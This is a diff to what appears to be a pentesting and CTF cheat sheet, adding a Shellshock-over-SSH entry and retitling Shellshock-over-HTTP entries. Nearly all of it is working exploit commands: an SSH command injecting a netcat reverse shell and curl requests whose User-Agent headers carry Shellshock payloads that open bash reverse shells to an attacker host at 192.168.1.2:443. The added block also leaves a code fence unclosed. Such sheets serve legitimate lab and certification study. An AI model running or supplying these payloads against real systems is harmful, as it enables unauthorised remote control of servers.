@@ -54,7 +54,11 @@ __Pentesting - Red Team - CTFs - OSCP__
   ```
   ---
   
-`Shellshock`
+ `Shellshock (SSH)`
+ 
+ ```cmd
+ root@kali:~# ssh user@192.168.1.3 -i id_rsa  '() { :;}; nc 192.168.1.2 443 -e /bin/bash'
+ `Shellshock (HTTP)`
 
   ```cmd
   curl -H "User-Agent: () { :; }; /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'" "http://192.168.1.3/cgi-bin/evil.sh"
@@ -62,7 +66,7 @@ __Pentesting - Red Team - CTFs - OSCP__
   curl -H "User-Agent: () { :; }; /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'" "http://192.168.1.3/cgi-bin/evil.cgi"
   ```
   
-  `Shellshock (Internal Server Error)`
+  `Shellshock (HTTP) [Internal Server Error]`
 
   ```cmd
   curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'" "http://192.168.1.3/cgi-bin/evil.sh"
